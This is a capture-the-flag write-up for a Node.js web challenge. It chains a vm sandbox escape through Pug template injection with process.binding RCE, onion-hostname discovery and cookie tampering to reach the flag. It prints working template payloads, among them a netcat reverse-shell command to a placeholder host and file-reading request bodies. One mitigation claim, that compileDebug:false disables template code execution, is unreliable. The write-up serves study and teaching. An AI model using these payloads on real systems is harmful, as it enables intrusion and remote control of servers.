# Tunnel to Another Dimension - CTF Challenge Writeup

## Challenge Overview

**Challenge Name:** Tunnel to Another Dimension  
**Category:** Web Security  
**Difficulty:** Hard  
**Flag:** `ghctf{TunN31_TO_darK_wEb}`

This challenge involves exploiting a Node.js VM sandbox escape through Pug template injection, discovering a Tor hidden service, and manipulating cookies to access the final flag.

## Challenge Description

The challenge presents a Node.js application that renders Pug templates using the VM module for sandboxing. Players must escape the sandbox, discover a Tor hidden service, and navigate through client-side restrictions to obtain the flag.

## Initial Reconnaissance

1. **Application Structure Analysis:**

   - Node.js Express application with Pug template rendering
   - VM module sandboxing for template execution
   - Tor hidden service configuration
   - Nginx reverse proxy with cookie-based access control

2. **Key Components:**
   - `index.js` - Main application with VM sandbox
   - `nginx/default.conf` - Nginx configuration with flag logic
   - `script.js` - Client-side JavaScript with cookie manipulation
   - Tor hidden service hostname

## Vulnerability Analysis

### Phase 1: VM Sandbox Escape

The primary vulnerability lies in the weak VM sandboxing implementation in `/render` endpoint:

```javascript
app.post("/render", (req, res) => {
  const template = req.body.template;

  const script = new vm.Script(`
    const rendered = render(template);
    result = rendered;
    `); // sandboxed template , fully secure

  const context = vm.createContext({
    render: (tmpl) => pug.render(tmpl),
    template,
    result: "",
  }); //limited context

  try {
    script.runInContext(context); //run in isolated context
    res.status(200).send(context.result);
  } catch (error) {
    // Error handling
  }
});
```

**The Problem:** VM sandboxing in Node.js is notoriously weak and can be easily escaped, especially when combined with template engines like Pug that allow code execution.

### Phase 2: Pug Template Injection

Pug templates support embedded JavaScript execution, which makes them dangerous when processing user input:

```pug
h1 #{javascript_code_here}
```

### Phase 3: ES6 Module Limitations

The application uses ES6 modules (`import`), which means the traditional `require()` function is not available in the global scope, making direct RCE through `require('child_process')` impossible.

Additionally, common VM escape techniques that rely on accessing `require` through `process.mainModule.constructor._load` or similar module loading mechanisms are also not viable in this ES6 module environment, as the module system works differently and these legacy CommonJS patterns are not accessible.

### Phase 4: Process Binding Exploitation

The solution involves using `process.binding()` to access Node.js native bindings, bypassing the ES6 module restrictions.

## Exploitation Strategy

### Step 1: VM Sandbox Escape via Process Access

The VM sandbox can be escaped by accessing the global `process` object through Pug template injection:

```pug
h1 #{global.process}
```

This reveals that we have access to the Node.js process object and its methods.

### Step 2: Bypass ES6 Module Restrictions

Since `require()` is not available in ES6 modules, we use `process.binding()` to access native Node.js bindings:

```javascript
process.binding("spawn_sync"); // For command execution
process.binding("fs"); // For file system access
```

### Step 3: Remote Code Execution Payload

The exploit payload uses `spawn_sync` binding to execute system commands:

```pug
h4 #{global.process.binding('spawn_sync').spawn({
  file: '/bin/bash',
  args: ['/bin/bash', '-c', 'nc <ip> <port> -e sh'],
  stdio: [
    {type:'pipe',readable:!0,writable:!1},
    {type:'pipe',readable:!1,writable:!0},
    {type:'pipe',readable:!1,writable:!0}
  ]
}).output[1].toString()}
```

**Alternative File System Access:**

```pug
h4 #{process.binding("fs").readdir("/",0,0o666)}
```

checking available bindings:

```pug
h4 #{Object.keys(process.binding("fs")).filter(t=> typeof t ==="string")}
```

Or for reading files:

```pug
h4 #{process.binding("fs").readFileUtf8("/app/index.js",0,0o666)}
```

### Step 4: Discover Tor Hidden Service

Through RCE or file system access, discover the Tor configuration and hostname:

```bash
cat /var/lib/tor/hidden_service/hostname
```

**Discovered hostname:** `ghctfmdcyqtwqpvui2uq5nmbhsmxdpbsfucg523zsnula4iwszoe4rqd.onion`

### Step 5: Access the Hidden Service

Connect to the Tor hidden service using a Tor browser or proxy:

```
http://ghctfmdcyqtwqpvui2uq5nmbhsmxdpbsfucg523zsnula4iwszoe4rqd.onion/
```

### Step 6: Analyze Client-Side Code

The hidden service serves a page with `script.js` that attempts to set a cookie:

```javascript
document.cookie = "secret_agent=0; path=/; max-age=3600 HTTPOnly";
```

**Issue:** The cookie is set with `HTTPOnly` flag in JavaScript, which is invalid and causes the cookie setting to fail.

### Step 8: Extract the Flag

1. **Set the correct cookie:**

   - Manually set `secret_agent=1` using browser developer tools
   - Or intercept and modify the request

2. **Access the flag:**
   - Navigate to the root URL with the correct cookie
   - Get redirected to `/flag.html`
   - The flag is revealed in the `x-Real-Flag` header: `ghctf{TunN31_TO_darK_wEb}`

## Proof of Concept

### Complete Exploit Flow:

1. **Initial VM Escape Payload:**

   ```
   POST /render
   Content-Type: application/json

   {
     "template": "h1 #{global.process.binding('fs').open('/var/lib/tor/hidden_service/hostname', 0, 0o644)}"
   }
   ```

2. **RCE for Discovery:**

   ```
   POST /render
   Content-Type: application/json

   {
     "template": "h4 #{global.process.binding('spawn_sync').spawn({file: '/bin/bash',args: ['/bin/bash', '-c', 'ls -la /var/lib/tor/'],stdio: [{type:'pipe',readable:!0,writable:!1},{type:'pipe',readable:!1,writable:!0},{type:'pipe',readable:!1,writable:!0}]}).output[1].toString()}"
   }
   ```

3. **Access Hidden Service:**

   - Use Tor browser to navigate to discovered onion address
   - Inspect `script.js` to understand cookie mechanism

4. **Flag Extraction:**
   - Set cookie `secret_agent=1`
   - Access root URL to trigger redirect
   - Extract flag from `x-Real-Flag` header

## Technical Deep Dive

### VM Sandbox Escape Mechanics

Node.js VM module provides isolation but not security:

- Shared global objects like `process` remain accessible
- Constructor prototype pollution can escape sandbox
- Template engines compound the problem by allowing code execution

### Process Binding Exploitation

`process.binding()` is an internal Node.js API that exposes native modules:

- `spawn_sync`: Direct access to process spawning
- `fs`: File system operations without require (uses native C++ signatures)
- Bypasses ES6 module restrictions

**Important Note:** The `fs` binding functions use different signatures than the regular `fs` module:

- `process.binding('fs').open(path, flags, mode)` - Opens a file descriptor
- `process.binding('fs').read(fd, buffer, offset, length, position)` - Reads from fd
- `process.binding('fs').readdir(path)` - Lists directory contents

These are low-level C++ bindings that require manual buffer management and different parameter handling.

### Tor Hidden Service Discovery

The challenge simulates a real-world scenario where:

- Application runs within Tor network
- Hostname must be discovered through RCE
- Access requires proper network configuration (Tor proxy)

## Impact and Mitigation

### Impact

- **Complete System Compromise:** RCE through VM escape
- **Information Disclosure:** Access to sensitive files and network configuration
- **Network Lateral Movement:** Discovery of hidden services

### Mitigation Strategies

1. **Avoid VM for Security Boundaries:**

   ```javascript
   // Don't use VM for sandboxing user input
   // Use proper sandboxing solutions like containers
   ```

2. **Template Engine Security:**

   ```javascript
   // Disable code execution in templates
   pug.render(template, { compileDebug: false, cache: false });
   ```

3. **Process Binding Restrictions:**

   ```javascript
   // Remove dangerous process methods
   delete process.binding;
   delete process.mainModule;
   ```

4. **Input Validation:**
   ```javascript
   // Strict template validation
   const allowedTemplatePattern = /^[a-zA-Z0-9\s\-_\.]+$/;
   if (!allowedTemplatePattern.test(template)) {
     return res.status(400).send("Invalid template");
   }
   ```

## Conclusion

This challenge demonstrates a sophisticated attack chain combining multiple vulnerabilities:

1. **VM Sandbox Escape** - Exploiting weak Node.js VM isolation
2. **Template Injection** - Pug template code execution
3. **ES6 Module Bypass** - Using process.binding() instead of require()
4. **Network Discovery** - Finding Tor hidden services
5. **Client-Side Analysis** - Understanding cookie manipulation logic

The key lessons are:

- VM module should never be used for security boundaries
- Template engines with code execution are dangerous with user input
- Defense in depth is crucial for complex applications
- Hidden services don't guarantee security if the application is vulnerable

**Final Flag:** `ghctf{TunN31_TO_darK_wEb}`
